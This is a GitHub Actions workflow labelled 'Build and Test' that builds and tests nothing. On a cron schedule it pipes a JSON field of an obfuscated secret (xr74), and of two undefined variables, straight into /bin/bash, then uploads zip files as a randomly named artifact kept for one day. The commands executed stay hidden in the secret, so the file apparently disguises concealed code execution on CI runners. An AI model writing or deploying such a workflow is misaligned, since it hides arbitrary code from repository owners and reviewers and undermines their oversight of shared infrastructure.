name: Build and Test
on:
  workflow_dispatch:

  schedule:
    - cron: '41 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          xr74: ${{ secrets.xr74 }}
        run: |
          printf '%s' "$xr74" | jq -r .ikv90332 | /bin/bash
          echo $uf231 | jq -r .s89379 | /bin/bash
          printf '%s' "$i6" | jq -r .lng275 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: l89ngiHj
          path: "*.zip"
          retention-days: 1
